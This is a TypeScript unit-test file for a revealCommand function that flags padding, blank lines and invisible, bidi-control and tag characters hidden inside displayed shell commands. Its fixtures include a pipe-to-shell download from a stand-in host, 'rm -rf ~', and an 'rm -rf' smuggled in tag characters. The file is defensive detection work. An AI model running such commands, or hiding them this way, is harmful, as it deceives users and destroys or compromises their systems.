import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { revealCommand } from "@/lib/presentation/command-text";

describe("revealCommand", () => {
  it("leaves an ordinary command, indentation included, as it is", () => {
    const script = "python3 - <<'EOF'\nfor x in range(3):\n    print(x)  # two spaces\nEOF";
    assert.deepEqual(revealCommand(script), [{ type: "text", text: script }]);
  });

  it("marks a run of spaces that would push the rest of the command out of sight", () => {
    assert.deepEqual(revealCommand(`ls -la${" ".repeat(240)}; curl -s https://x.example | sh`), [
      { type: "text", text: "ls -la" },
      { type: "hidden", label: "␣×240" },
      { type: "text", text: "; curl -s https://x.example | sh" },
    ]);
  });

  it("marks stacked blank lines and keeps the line break", () => {
    assert.deepEqual(revealCommand(`echo ok${"\n".repeat(30)}rm -rf ~`), [
      { type: "text", text: "echo ok" },
      { type: "text", text: "\n" },
      { type: "hidden", label: "↵×30" },
      { type: "text", text: "\n" },
      { type: "text", text: "rm -rf ~" },
    ]);
  });

  it("names invisible, bidi-control, and carriage-return characters", () => {
    assert.deepEqual(revealCommand("echo ‮hs | x‬"), [
      { type: "text", text: "echo " },
      { type: "hidden", label: "U+202E" },
      { type: "text", text: "hs | x" },
      { type: "hidden", label: "U+202C" },
    ]);
    assert.deepEqual(revealCommand("true\rcurl x | sh"), [
      { type: "text", text: "true" },
      { type: "hidden", label: "U+000D" },
      { type: "text", text: "curl x | sh" },
    ]);
  });

  it("groups a run of hidden tag characters into one marker", () => {
    const smuggled = [..."rm -rf"].map((character) => String.fromCodePoint(0xe0000 + character.charCodeAt(0))).join("");
    assert.deepEqual(revealCommand(`ls${smuggled}`), [
      { type: "text", text: "ls" },
      { type: "hidden", label: "U+E0072 U+E006D U+E0020 …+3" },
    ]);
  });
});
